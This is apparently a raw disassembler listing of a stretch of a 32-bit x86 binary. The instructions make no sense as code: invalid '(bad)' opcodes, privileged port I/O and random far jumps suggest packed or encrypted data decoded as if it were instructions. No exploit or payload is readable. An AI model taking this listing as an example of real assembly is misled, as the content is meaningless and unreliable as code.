  4237c5:	xor    esp,DWORD PTR ds:0xd1df6c4c
  4237cb:	or     DWORD PTR [edx+0x53],edx
  4237ce:	add    dh,BYTE PTR [ecx+edi*4-0x2b887b2]
  4237d5:	adc    ch,BYTE PTR [eax-0x438d7a6a]
  4237db:	cs xchg edi,eax
  4237dd:	test   ch,bh
  4237df:	sti    
  4237e0:	lahf   
  4237e1:	in     al,0xda
  4237e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237e4:	xchg   edx,eax
  4237e5:	sbb    eax,0xe74b5af8
  4237ea:	add    ah,BYTE PTR [ebp-0x55]
  4237ed:	js     0x4237d0
  4237ef:	mov    ch,0x5f
  4237f1:	rcr    DWORD PTR [edi-0x5dc5e7c0],cl
  4237f7:	adc    cl,BYTE PTR [esi]
  4237f9:	mov    esi,0xe7e12911
  4237fe:	leave  
  4237ff:	stos   BYTE PTR es:[edi],al
  423800:	mov    edi,ebp
  423802:	daa    
  423803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423804:	sbb    esp,DWORD PTR [edx-0x51]
  423807:	aaa    
  423808:	xor    eax,0x6cac1e03
  42380d:	mov    edi,0x13e8cb54
  423812:	jnp    0x4237b7
  423814:	mov    ebx,DWORD PTR [edi+0xc11d3f9]
  42381a:	push   ss
  42381b:	cmp    dh,BYTE PTR [ebx+0xf]
  42381e:	jmp    0x150c:0x4574fe24
  423825:	inc    esi
  423826:	aaa    
  423827:	adc    al,0x88
  423829:	jo     0x423894
  42382b:	mov    esi,0x5d385220
  423830:	xchg   BYTE PTR [ebp+edi*8-0x32],dh
  423834:	iret   
  423835:	jg     0x423844
  423837:	enter  0xfc5,0x62
  42383b:	or     al,dh
  42383d:	idiv   al
  42383f:	add    eax,0x7abe6a7c
  423844:	and    DWORD PTR [eax+0x1f],ecx
  423847:	neg    bl
  423849:	pop    ebp
  42384a:	lock out dx,eax
  42384c:	jo     0x42388e
  42384e:	xor    bl,al
  423850:	ror    DWORD PTR [esi-0x7d],0xe8
  423854:	mov    dl,0x2d
  423856:	mov    ebx,0x1381abdf
  42385b:	imul   edx,DWORD PTR [eax],0xc36cfa33
  423861:	add    DWORD PTR [eax],esi
  423863:	inc    ebx
  423864:	xchg   edi,eax
  423865:	push   edx
  423866:	jne    0x4237e9
  423868:	mov    dh,0x4a
  42386a:	jge    0x4238bb
  42386c:	inc    esp
  42386d:	xchg   dh,dh
  42386f:	es pop ebx
  423871:	sahf   
  423872:	mov    ch,0x86
  423874:	leave  
  423875:	jp     0x423853
  423877:	push   ebp
  423878:	out    dx,al
  423879:	cmp    cl,BYTE PTR [ebp+0x7b]
  42387c:	call   0x779b:0x24679cd
  423883:	cmp    DWORD PTR [esi+0x1221641b],ecx
  423889:	mov    bl,0x6f
  42388b:	in     eax,0x14
  42388d:	xchg   BYTE PTR [edx],bh
  42388f:	jp     0x4238bb
  423891:	add    al,0x45
  423893:	(bad)  
  423894:	jle    0x42387d
  423896:	les    esi,FWORD PTR [edi+0x16]
  423899:	dec    esp
  42389a:	pop    es
  42389b:	mov    dh,0x4c
  42389d:	int3   
  42389e:	and    eax,0x54955bb
  4238a3:	lock jnp 0x4238b0
  4238a6:	push   esp
  4238a7:	cmp    al,0x1e
  4238a9:	stos   BYTE PTR es:[edi],al
  4238aa:	nop
  4238ab:	nop
  4238ac:	mov    dh,0xee
  4238ae:	(bad)  
  4238af:	mov    eax,ds:0xf52393ab
  4238b4:	dec    eax
  4238b5:	cs adc al,dh
  4238b8:	inc    ebx
  4238b9:	cli    
  4238ba:	ret    0x3082
  4238bd:	push   0x1e
  4238bf:	xchg   esi,eax
  4238c0:	dec    ecx
  4238c1:	rcl    BYTE PTR [edi+0x71],1
  4238c4:	test   BYTE PTR [ebx-0x236b9ce2],al
  4238ca:	sub    DWORD PTR ds:0x70784ef0,esi
  4238d0:	mov    esp,DWORD PTR [edx-0x4f9fb143]
  4238d6:	icebp  
  4238d7:	fst    st(2)
  4238d9:	in     eax,dx
  4238da:	sbb    al,0xb3
  4238dc:	pop    esp
  4238dd:	(bad)  
  4238de:	imul   edx,esi,0x87a81590
  4238e4:	xor    DWORD PTR [esi],ecx
  4238e6:	ss push 0xd17eb6df
  4238ec:	cmc    
  4238ed:	outs   dx,BYTE PTR ds:[esi]
  4238ee:	loop   0x4238a9
  4238f0:	popa   
  4238f1:	das    
  4238f2:	test   BYTE PTR [ebx-0x2e],al
  4238f5:	out    dx,al
  4238f6:	or     bh,BYTE PTR [edi]
  4238f8:	rcr    DWORD PTR [edi+0x1c],0xfd
  4238fc:	rol    BYTE PTR [ecx],cl
  4238fe:	jl     0x423896
  423900:	mov    cl,0x9e
  423902:	ret    0x538
  423905:	xchg   ecx,eax
  423906:	js     0x4238d9
  423908:	cmp    al,0xa1
  42390a:	lahf   
  42390b:	je     0x42397a
  42390d:	cdq    
  42390e:	mov    eax,0xf25a01fb
  423913:	lahf   
  423914:	scas   eax,DWORD PTR es:[edi]
  423915:	loop   0x42396b
  423917:	in     al,dx
  423918:	nop
  423919:	cli    
  42391a:	jmp    0x7b95:0x8975353d
  423921:	push   edx
  423922:	mov    ds,WORD PTR [edi]
  423924:	aas    
  423925:	retf   
  423926:	jmp    0x37b1f498
  42392b:	dec    edi
  42392c:	(bad)  
  42392e:	pop    ecx
  42392f:	test   BYTE PTR [edx-0x1e8bb4],0xde
  423936:	mov    bl,0xda
  423938:	pop    ebx
  423939:	push   0xa21da396
  42393e:	dec    BYTE PTR [ebx+ecx*8+0x66]
  423942:	pop    esp
  423943:	sub    eax,0x6e82ddac
  423948:	in     eax,dx
  423949:	out    dx,al
  42394a:	scas   eax,DWORD PTR es:[edi]
  42394b:	add    al,0x50
  42394d:	lods   al,BYTE PTR ds:[esi]
  42394e:	scas   al,BYTE PTR es:[edi]
  42394f:	stos   BYTE PTR es:[edi],al
  423950:	cld    
  423951:	xor    al,0x3d
  423953:	add    al,BYTE PTR [eax+0x5c7ab80]
  423959:	sub    esp,edi
  42395b:	mov    ebp,0x6630cc3b
  423960:	push   ebx
  423961:	pusha  
  423962:	pop    ss
  423963:	fdiv   st,st(6)
  423965:	retf   
  423966:	inc    esi
  423967:	mov    ebp,0xfe621966
  42396c:	out    dx,eax
  42396d:	pop    esi
  42396e:	xchg   BYTE PTR [ebx+0x1c7606ee],cl
  423974:	cmc    
  423975:	inc    ebp
  423976:	js     0x4239b6
  423978:	jnp    0x423994
  42397a:	xchg   DWORD PTR [ebx+eax*8+0x3c],esp
  42397e:	cs test eax,0x50d8424f
  423984:	mov    ah,0x39
  423986:	outs   dx,DWORD PTR ds:[esi]
  423987:	jns    0x4239b7
  423989:	xchg   edi,eax
  42398a:	or     cl,bh
  42398c:	jb     0x4239f1
  42398e:	or     bl,BYTE PTR [esi-0x6]
  423991:	(bad)  [eax]
  423993:	xchg   edi,eax
  423994:	inc    edi
  423995:	leave  
  423996:	out    dx,al
  423997:	arpl   WORD PTR ds:0xab63eb62,bx
  42399d:	or     bh,al
  42399f:	bound  eax,QWORD PTR [ebx-0x38]
  4239a2:	test   eax,0x7ec22a04
  4239a7:	jae    0x42396e
  4239a9:	cmp    eax,0xbdc6807e
  4239ae:	and    ch,cl
  4239b0:	repz shl DWORD PTR [ebx+0x1d],0x9c
  4239b5:	(bad)  
  4239b7:	fs dec esi
  4239b9:	cdq    
  4239ba:	ds enter 0xd524,0xc6
  4239bf:	jmp    0x423a0e
  4239c1:	loop   0x423a29
  4239c3:	je     0x423971
  4239c5:	(bad)  
  4239c6:	cdq    
  4239c7:	mov    esp,0xf9348a9b
  4239cc:	hlt    
  4239cd:	inc    ecx
  4239ce:	jo     0x423a41
  4239d0:	aaa    
  4239d1:	sbb    DWORD PTR [edi+0x3003942a],ecx
  4239d7:	inc    edi
  4239d8:	ins    BYTE PTR es:[edi],dx
  4239d9:	fcmovb st,st(1)
  4239db:	and    al,0xdd
  4239dd:	add    esi,edi
  4239df:	dec    edi
  4239e0:	fmul   QWORD PTR [ebx]
  4239e2:	pop    ds
  4239e3:	stc    
  4239e4:	or     DWORD PTR [edi-0x4d],ecx
  4239e7:	xlat   BYTE PTR ds:[ebx]
  4239e8:	arpl   WORD PTR ds:0xc0beb23e,sp
  4239ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239ef:	and    BYTE PTR [edx+ecx*1-0x40d7a0bd],dl
  4239f6:	enter  0x374c,0xc
  4239fa:	and    eax,0xb0d3cf7c
  4239ff:	or     eax,0x944ab608
  423a04:	ja     0x423a85
  423a06:	sbb    edx,DWORD PTR [ebp-0x11638649]
  423a0c:	int    0xa7
  423a0e:	jge    0x4239bf
  423a10:	cmp    BYTE PTR [esi-0x3d],ah
  423a13:	inc    ebx
  423a14:	sub    BYTE PTR [ecx],bl
  423a16:	lods   eax,DWORD PTR ds:[esi]
  423a17:	dec    edi
  423a18:	pop    esp
  423a19:	sub    bh,BYTE PTR [edi]
  423a1b:	scas   eax,DWORD PTR es:[edi]
  423a1c:	lock lahf 
  423a1e:	nop
  423a1f:	dec    esp
  423a20:	leave  
  423a21:	mov    edi,0x21ca195c
  423a26:	inc    ecx
  423a27:	stos   BYTE PTR es:[edi],al
  423a28:	lock je 0x423a53
  423a2b:	mul    DWORD PTR [esp+edx*4-0x4a3d83da]
  423a32:	push   ds
  423a33:	push   cs
  423a34:	fwait
  423a35:	and    cl,BYTE PTR [edi]
  423a37:	into   
  423a38:	bound  ebp,QWORD PTR [ecx+eiz*4+0x4c]
  423a3c:	lahf   
  423a3d:	mov    ebp,0xee250720
  423a42:	push   ebx
  423a43:	pop    edx
  423a44:	push   0x4a
  423a46:	sti    
  423a47:	leave  
  423a48:	out    0x4e,eax
  423a4a:	cmc    
  423a4b:	xchg   ebx,eax
  423a4c:	jmp    0x423aa5
  423a4e:	xchg   DWORD PTR [ebx-0x5c],esp
  423a51:	and    ch,BYTE PTR [ecx+ebx*1-0x3]
  423a55:	cmp    ecx,DWORD PTR [ebx+ebp*4-0x3d]
  423a59:	call   0xf882cd97
  423a5e:	lea    edi,[esi+0x6b]
  423a61:	fiadd  WORD PTR [edi-0x3cb9ff75]
  423a67:	mov    esi,0xe9b5b301
  423a6c:	mov    edi,0x98bb9030
  423a71:	sub    edi,DWORD PTR [ebx]
  423a73:	aaa    
  423a74:	sti    
  423a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a76:	stc    
  423a77:	dec    edx
  423a78:	mov    esi,0xff86cd3c
  423a7d:	inc    esi
  423a7e:	shr    BYTE PTR [edi-0x4a],cl
  423a81:	sahf   
  423a82:	push   ss
  423a83:	ret    
  423a84:	into   
  423a85:	add    BYTE PTR [eax+0x66],ch
  423a88:	cli    
  423a89:	mov    cl,0x69
  423a8b:	cmp    al,0xf2
  423a8d:	jnp    0x423abf
  423a8f:	push   edi
  423a90:	fist   WORD PTR [edx+0xe]
  423a93:	test   al,0x45
  423a95:	inc    ebp
  423a96:	(bad)  
  423a97:	xabort 0x43
  423a9a:	mov    eax,ds:0x2eb692e0
  423a9f:	inc    esp
  423aa0:	ror    esi,0x3a
  423aa3:	mul    al
  423aa5:	jnp    0x423aa7
  423aa7:	ds jb  0x423a5a
  423aaa:	ret    0x752a
  423aad:	aad    0xff
  423aaf:	rcr    BYTE PTR [edi],0x19
  423ab2:	cs mov edi,0x329aa97d
	...
  423ac0:	add    BYTE PTR [ecx-0x6],cl
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi+0x52],cs
  423ace:	mov    ebp,ebp
  423ad0:	sub    BYTE PTR [ebx+esi*4+0x1],0x0
  423ad5:	scas   eax,DWORD PTR es:[edi]
  423ad6:	add    eax,DWORD PTR [eax]
  423ad8:	add    BYTE PTR [edi],bl
  423ada:	das    
  423adb:	inc    ebp
  423adc:	xor    eax,0x7a7b46e2
  423ae1:	add    al,0x63
  423ae3:	inc    ecx
  423ae4:	ins    BYTE PTR es:[edi],dx
  423ae5:	mov    al,ds:0x1ab5ff76
  423aea:	(bad)  
  423aeb:	jge    0x423a89
  423aed:	das    
  423aee:	push   cs
  423aef:	mov    esp,0x90d2e4e1
  423af4:	mov    bl,0x28
  423af6:	ja     0x423b70
  423af8:	sbb    dh,al
  423afa:	or     eax,0x85a6746c
  423aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b00:	push   ecx
  423b01:	mov    ebx,0xc3cd4c38
  423b06:	mov    fs,esi
  423b08:	js     0x423b2d
  423b0a:	mov    BYTE PTR ds:0xd96c1812,bh
  423b10:	pop    esi
  423b11:	mov    al,ds:0x1f6f14f1
  423b16:	pop    esp
  423b17:	cmp    ecx,DWORD PTR [esi+0xc]
  423b1a:	shr    DWORD PTR [ecx+0x4591b1f1],cl
  423b20:	add    eax,0x958ccb5c
  423b25:	rol    BYTE PTR gs:[ebx+esi*8-0x629eb9ac],1
  423b2d:	xchg   esp,eax
  423b2e:	inc    esi
  423b2f:	pop    ss
  423b30:	push   eax
  423b31:	out    0xa8,al
  423b33:	in     al,dx
  423b34:	imul   ebx,DWORD PTR [eax-0x69ab8172],0xed859b6e
  423b3e:	(bad)  [ebp-0xe784ff4]
  423b44:	popa   
  423b45:	pop    esi
  423b46:	lods   al,BYTE PTR ds:[esi]
  423b47:	sbb    eax,0xdab21dec
  423b4c:	fist   DWORD PTR [edi-0x3b7bd872]
  423b52:	clc    
  423b53:	hlt    
  423b54:	gs (bad) 
  423b57:	jae    0x423b75
  423b59:	xchg   esi,eax
  423b5a:	pop    eax
  423b5b:	push   es
  423b5c:	pop    es
  423b5d:	add    ch,BYTE PTR [ebp-0x6d]
  423b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b61:	jmp    0xb2b6:0xbf2f59a
  423b68:	lods   eax,DWORD PTR ds:[esi]
  423b69:	adc    DWORD PTR [edi],esi
  423b6b:	adc    BYTE PTR [ebp+0x4b7f26ac],0x9b
  423b72:	pusha  
  423b73:	iret   
  423b74:	sahf   
  423b75:	int    0x30
  423b77:	xchg   edx,eax
  423b78:	xor    DWORD PTR [eax+0x11],ebx
  423b7b:	xchg   ebx,eax
  423b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b7d:	(bad)  
  423b7e:	test   eax,0x201920ca
  423b83:	xor    BYTE PTR [esi+0x37b8c153],ah
  423b89:	sahf   
  423b8a:	dec    esp
  423b8b:	sahf   
  423b8c:	scas   eax,DWORD PTR es:[edi]
  423b8d:	sbb    dl,cl
  423b8f:	jns    0x423be7
  423b91:	mov    edi,0x56b8c4b0
  423b96:	sub    al,0x3e
  423b98:	pushf  
  423b99:	sti    
  423b9a:	xchg   esp,eax
  423b9b:	icebp  
  423b9c:	jnp    0x423b21
  423b9e:	add    eax,0x18c0a5bc
  423ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba4:	xor    al,0x64
  423ba6:	push   ebp
  423ba7:	mov    esi,0xfa299db9
  423bac:	test   DWORD PTR [esi-0x3a0df92f],esi
  423bb2:	adc    ebp,DWORD PTR [ecx+ecx*2+0x290c5e8d]
  423bb9:	xor    bh,0xcd
  423bbc:	push   edx
  423bbd:	push   ss
  423bbe:	addr16 ds (bad) 
  423bc1:	jmp    0x4e83:0xf04979d0
  423bc8:	es push es
  423bca:	jmp    0x423c3d
  423bcc:	mov    WORD PTR [esi-0x69],ds
  423bcf:	ins    DWORD PTR es:[edi],dx
  423bd0:	in     eax,0xf6
  423bd2:	inc    ebp
  423bd3:	and    ebp,DWORD PTR [esi-0x6e]
  423bd6:	and    al,0x6c
  423bd8:	shl    DWORD PTR [edx+ebp*1+0x705262a9],0x65
  423be0:	pushf  
  423be1:	stos   BYTE PTR es:[edi],al
  423be2:	stos   DWORD PTR es:[edi],eax
  423be3:	cmp    al,0xdd
  423be5:	and    BYTE PTR [esi+0x680b9214],bl
  423beb:	mov    esp,0xc05cfeef
  423bf0:	sub    DWORD PTR [edi-0x73],eax
  423bf3:	mov    ah,0x7c
  423bf5:	icebp  
  423bf6:	call   0x2a21:0xa819c42c
  423bfd:	pop    ss
  423bfe:	add    DWORD PTR [esi],edx
  423c00:	inc    ebp
  423c01:	sub    bl,dh
  423c03:	sbb    al,0xec
  423c05:	ja     0x423c21
  423c07:	xchg   DWORD PTR [ecx-0x5efa935d],eax
  423c0d:	jmp    0xf669a8f4
  423c12:	jmp    0x423b98
  423c14:	mov    eax,0x612e2cd3
  423c19:	push   ebp
  423c1a:	gs push edx
  423c1c:	push   ebx
  423c1d:	xchg   DWORD PTR [eax],esi
  423c1f:	mov    ds,edx
  423c21:	jp     0x423c13
  423c23:	lea    ebp,[edx+ebx*1]
  423c26:	sub    al,0xc3
  423c28:	xor    edx,DWORD PTR [esi-0x26378334]
  423c2e:	pop    esi
  423c2f:	fsubr  DWORD PTR [ebx]
  423c31:	pushf  
  423c32:	scas   al,BYTE PTR es:[edi]
  423c33:	pushfw 
  423c35:	pop    ds
  423c36:	pop    esi
  423c37:	lds    edi,FWORD PTR [ecx]
  423c39:	xchg   ecx,eax
  423c3a:	jno    0x423c5e
  423c3c:	pop    es
  423c3d:	jp     0x423ca3
  423c3f:	fs pop esi
  423c41:	or     esp,DWORD PTR [eax]
  423c43:	sbb    al,0x1d
  423c45:	pop    esp
  423c46:	pop    eax
  423c47:	mov    al,0x8d
  423c49:	adc    ecx,edi
  423c4b:	data16 mov dl,0x2d
  423c4e:	lock adc al,0xc6
  423c51:	push   ecx
  423c52:	sbb    dl,BYTE PTR [eax+ebp*8-0x52]
  423c56:	cmp    BYTE PTR [ecx],ch
  423c58:	xor    BYTE PTR [eax-0x47],0x92
  423c5c:	xchg   esp,eax
  423c5d:	in     al,0x47
  423c5f:	ins    DWORD PTR es:[edi],dx
  423c60:	test   DWORD PTR [eax+0x2ddd9f24],esp
  423c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c67:	cmc    
  423c68:	mov    ebp,DWORD PTR [edx-0x1c]
  423c6b:	sti    
  423c6c:	inc    edi
  423c6d:	(bad)  
  423c6f:	cld    
  423c70:	sub    al,0x9a
  423c72:	iret   
  423c73:	dec    esp
  423c74:	ins    BYTE PTR es:[edi],dx
  423c75:	adc    eax,0xcc2d9538
  423c7a:	pop    ebp
  423c7b:	loope  0x423cbc
  423c7d:	and    al,0x7f
  423c7f:	imul   edi,DWORD PTR cs:[esp+edi*1-0x58473bd9],0xffffff90
  423c88:	mov    ch,0x72
  423c8a:	fcomp  DWORD PTR [eax+0x5fab72c]
  423c90:	xchg   ebx,eax
  423c91:	xor    ebp,DWORD PTR [edx-0x4bf302b7]
  423c97:	push   ebp
  423c98:	stos   BYTE PTR es:[edi],al
  423c99:	lods   al,BYTE PTR ds:[esi]
  423c9a:	aaa    
  423c9b:	ror    WORD PTR cs:[edx],0x92
  423ca0:	add    eax,0x9e7ba9b9
  423ca5:	xchg   esi,eax
  423ca6:	jp     0x423c4a
  423ca8:	loop   0x423c44
  423caa:	xor    bl,BYTE PTR [eax+0x74]
  423cad:	rcl    BYTE PTR [eax+ebp*4-0xfe2bd92],1
  423cb4:	sub    ch,BYTE PTR [edx+0x5aecab8c]
  423cba:	outs   dx,BYTE PTR ds:[esi]
  423cbb:	loopne 0x423d05
  423cbd:	pop    ebp
  423cbe:	fnstsw WORD PTR [ebx+0xe]
  423cc1:	jne    0x423d00
  423cc3:	and    eax,0xdacd452b
  423cc8:	and    cl,dl
  423cca:	sbb    DWORD PTR [ebx],ebx
  423ccc:	mov    bl,0xa1
  423cce:	sub    eax,0x455b700c
  423cd3:	mov    al,ds:0x60bf374f
  423cd8:	push   ecx
  423cd9:	jo     0x423d2f
  423cdb:	inc    edx
  423cdc:	inc    edi
  423cdd:	sub    DWORD PTR [edi],eax
  423cdf:	mov    ss,edi
  423ce1:	cmp    BYTE PTR [esi],0xb
  423ce4:	in     al,0xe1
  423ce6:	mov    ah,0x38
  423ce8:	stos   DWORD PTR es:[edi],eax
  423ce9:	xchg   esp,eax
  423cea:	jle    0x423cfc
  423cec:	adc    DWORD PTR [esi+eiz*4+0x5],edx
  423cf0:	jp     0x423d6c
  423cf2:	jmp    0x4f2a:0x1e27aae0
  423cf9:	scas   al,BYTE PTR es:[edi]
  423cfa:	std    
  423cfb:	push   ss
  423cfc:	mov    dl,0x9e
  423cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cff:	mov    cl,0xe5
  423d01:	cmp    DWORD PTR [ebp*2-0x64bbdc63],0x24
  423d09:	(bad)  
  423d0a:	daa    
  423d0b:	lods   al,BYTE PTR ds:[esi]
  423d0c:	xchg   ebp,eax
  423d0d:	adc    DWORD PTR [ebx-0x26e0bbf7],esp
  423d13:	cmc    
  423d14:	(bad)  
  423d15:	ss mov bh,0x9d
  423d18:	ss bnd jne 0x423d5a
  423d1c:	xchg   edx,eax
  423d1d:	lods   al,BYTE PTR ds:[esi]
  423d1e:	call   0x57dd:0xd1968b5a
  423d25:	dec    esp
  423d26:	int    0x59
  423d28:	mov    al,ds:0x5a1f5351
  423d2d:	mov    al,BYTE PTR [esi]
  423d2f:	lods   al,BYTE PTR ds:[esi]
  423d30:	btr    edx,ecx
  423d33:	(bad)  
  423d34:	cwde   
  423d35:	dec    eax
  423d36:	das    
  423d37:	or     al,BYTE PTR ds:0xbeb4a55
  423d3d:	dec    edx
  423d3e:	aam    0x11
  423d40:	adc    esi,DWORD PTR [eax-0x41]
  423d43:	jo     0x423d5a
  423d45:	pop    edi
  423d46:	stos   BYTE PTR es:[edi],al
  423d47:	popa   
  423d48:	ins    DWORD PTR es:[edi],dx
  423d49:	add    eax,0x4d3c82b9
  423d4e:	push   cs
  423d4f:	mov    BYTE PTR [ebx-0x2f],al
  423d52:	pop    esp
  423d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d54:	outs   dx,DWORD PTR ds:[esi]
  423d55:	rol    DWORD PTR [ebp-0x6104d8a7],0x83
  423d5c:	ret    
  423d5d:	cld    
  423d5e:	xor    DWORD PTR [ebp+0x68a49c25],ecx
  423d64:	pop    edx
  423d65:	cmp    dh,ch
  423d67:	fadd   QWORD PTR [eax-0xd9424e9]
  423d6d:	shr    BYTE PTR [esp+ebp*4-0x3e4b0ead],1
  423d74:	sahf   
  423d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d76:	mov    edx,0x99789e98
  423d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d7c:	xchg   ah,dh
  423d7e:	test   al,0x28
  423d80:	xchg   BYTE PTR [esi],ch
  423d82:	push   0x69187bb7
  423d87:	div    edi
  423d89:	and    al,0x6a
  423d8b:	lds    edi,FWORD PTR [esi-0x1c356fdb]
  423d91:	das    
  423d92:	cmp    al,0x34
  423d94:	js     0x423d5a
  423d96:	sbb    DWORD PTR [ebx-0x2b],esi
  423d99:	and    dh,BYTE PTR [ecx-0x17]
  423d9c:	add    cl,BYTE PTR [ecx-0x3d]
  423d9f:	sbb    eax,0x6105dbea
  423da4:	mov    al,ds:0xd8f483ac
  423da9:	stos   BYTE PTR es:[edi],al
  423daa:	imul   edx,DWORD PTR [esi],0xffffffe2
  423dad:	enter  0xf957,0xdd
  423db1:	dec    eax
  423db2:	retf   
  423db3:	sub    eax,0xb5b41c5e
  423db8:	stos   DWORD PTR es:[edi],eax
  423db9:	and    DWORD PTR [eax+0x51fe1fdc],edi
  423dbf:	jg     0x423dc1
  423dc1:	outs   dx,BYTE PTR ds:[esi]
  423dc2:	imul   edi,ebx,0x6c
  423dc5:	push   esi
  423dc6:	pop    eax
  423dc7:	and    DWORD PTR [ebx+0xd],edx
  423dca:	imul   ecx,DWORD PTR [edi+0x0],0x80f3a974
  423dd1:	ja     0x423d74
  423dd3:	or     cl,cl
  423dd5:	xlat   BYTE PTR ds:[ebx]
  423dd6:	fxch   st(6)
  423dd8:	mov    cl,0x7e
  423dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ddb:	stos   DWORD PTR es:[edi],eax
  423ddc:	xor    bl,bl
  423dde:	(bad)  
  423ddf:	jl     0x423e2c
  423de1:	gs retf 
  423de3:	mov    edi,0x345527fc
  423de8:	or     esi,ecx
  423dea:	jecxz  0x423e5d
  423dec:	pop    ebx
  423ded:	jg     0x423e18
  423def:	clc    
  423df0:	push   ecx
  423df1:	xchg   esp,eax
  423df2:	out    0x4d,al
  423df4:	call   0x4edc8bbe
  423df9:	jo     0x423dc2
  423dfb:	lahf   
  423dfc:	and    dh,BYTE PTR [esi+0x2a]
  423dff:	js     0x423e71
  423e01:	sub    eax,0xe83c3eb7
  423e06:	mov    eax,ds:0x7a7c2018
  423e0b:	xlat   BYTE PTR ds:[ebx]
  423e0c:	push   ss
  423e0d:	pushf  
  423e0e:	cmp    edi,DWORD PTR [ebp-0xc828c92]
  423e14:	(bad)  
  423e15:	fwait
  423e16:	lock std 
  423e18:	or     bh,BYTE PTR [esi]
  423e1a:	sti    
  423e1b:	retf   
  423e1c:	ds and al,0x32
  423e1f:	mov    BYTE PTR [ecx],ah
  423e21:	mov    ecx,0xf9f5fcbf
  423e26:	sbb    BYTE PTR ds:0xe88eb089,dh
  423e2c:	sub    eax,0x3a253b0f
  423e31:	repz xor cl,BYTE PTR ds:[eax]
  423e35:	lock jne 0x423e6b
  423e38:	jl     0x423e01
  423e3a:	call   0xccd42aad
  423e3f:	push   eax
  423e40:	rol    BYTE PTR [ebx+ebx*8],1
  423e43:	outs   dx,DWORD PTR ds:[esi]
  423e44:	sbb    esi,esp
  423e46:	jp     0x423df7
  423e48:	add    BYTE PTR [edx],ch
  423e4a:	sti    
  423e4b:	dec    ebx
  423e4c:	(bad)
  423e50:	lea    eax,[eax-0xa604aa7]
  423e56:	clc    
  423e57:	fld    TBYTE PTR ds:0x4f5f4060
  423e5d:	pop    ecx
  423e5e:	xchg   esp,eax
  423e5f:	or     BYTE PTR [ebx+0x61],dl
  423e62:	xor    esi,DWORD PTR [ecx]
  423e64:	in     al,0x47
  423e66:	daa    
  423e67:	hlt    
  423e68:	cmp    ch,bl
  423e6a:	inc    esi
  423e6b:	stos   DWORD PTR es:[edi],eax
  423e6c:	scas   al,BYTE PTR es:[edi]
  423e6d:	mul    DWORD PTR [esi+0x35]
  423e70:	stc    
  423e71:	test   eax,0x36ff16a2
  423e76:	inc    ebp
  423e77:	popa   
  423e78:	imul   edi,DWORD PTR [ecx-0x21ff922b],0xffffff91
  423e7f:	push   0xc8c42115
  423e84:	cmp    eax,0x2c1e5a
	...
  423e91:	xor    ebx,ecx
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0x5a
  423e9e:	test   eax,0xb71b275d
  423ea3:	add    DWORD PTR [eax],eax
  423ea5:	scas   eax,DWORD PTR es:[edi]
  423ea6:	add    eax,DWORD PTR [eax]
  423ea8:	add    BYTE PTR ds:0xf780ddd2,ch
  423eae:	adc    eax,0x728676fb
  423eb3:	or     al,0xde
  423eb5:	inc    ebp
  423eb6:	push   edi
  423eb7:	add    al,0x4d
  423eb9:	aaa    
  423eba:	xchg   esp,eax
  423ebb:	push   ebx
  423ebc:	or     esp,DWORD PTR [edi+0x55]
  423ebf:	and    eax,0x14e6caf6
  423ec4:	pop    es
  423ec5:	cmc    
  423ec6:	dec    edi
  423ec7:	xchg   BYTE PTR [edi],dh
  423ec9:	neg    DWORD PTR [ebp+0x58]
  423ecc:	ror    DWORD PTR gs:[ecx-0x38],cl
  423ed0:	pop    ebp
  423ed1:	push   es
  423ed2:	jb     0x423e80
  423ed4:	push   es
  423ed5:	int    0x29
  423ed7:	mov    fs,WORD PTR [edi+ecx*8-0x12]
  423edb:	gs es jae 0x423eef
  423edf:	pop    es
  423ee0:	sub    ecx,DWORD PTR cs:[esp+eiz*4-0x66332f02]
  423ee8:	add    ch,BYTE PTR [ebx-0x7a]
  423eeb:	icebp  
  423eec:	mov    ds:0xf0f7fe7c,al
  423ef1:	cs sbb eax,0xf7220181
  423ef7:	sbb    cl,BYTE PTR [eax+0xc81ed2c]
  423efd:	bnd jnp 0x423ef5
  423f00:	add    al,bl
  423f02:	popf   
  423f03:	sbb    al,0xb7
  423f05:	mov    ch,0x9e
  423f07:	fcmovb st,st(5)
  423f09:	and    ah,ah
  423f0b:	and    BYTE PTR [edi+0x60c10b75],dl
  423f11:	retf   0xc624
  423f14:	retf   
  423f15:	or     ecx,edx
  423f17:	imul   ebp,DWORD PTR [esi-0x48],0x40
  423f1b:	int    0x12
  423f1d:	(bad)  
  423f1e:	stc    
  423f1f:	fld    QWORD PTR [ebp-0x54198c02]
  423f25:	adc    dl,dl
  423f27:	mov    ecx,0x339eaaec
  423f2c:	mov    DWORD PTR [edx-0x6a],esp
  423f2f:	adc    eax,DWORD PTR [edi]
  423f31:	dec    ecx
  423f32:	cld    
  423f33:	(bad)  
  423f34:	push   0x22449b85
  423f39:	jb     0x423f25
  423f3b:	fs into 
  423f3d:	sub    BYTE PTR [ebx*8-0xb9353a4],cl
  423f44:	xchg   esi,eax
  423f45:	div    BYTE PTR [ebp-0x654f8144]
  423f4b:	imul   eax,DWORD PTR [edx],0x8d22a4df
  423f51:	mov    ah,0x79
  423f53:	mov    bh,0x1c
  423f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f56:	dec    ecx
  423f57:	push   ebx
  423f58:	inc    ebp
  423f59:	es inc edx
  423f5b:	out    0x24,al
  423f5d:	inc    ecx
  423f5e:	add    BYTE PTR [ebx+0x5f3b8082],cl
  423f64:	(bad)  
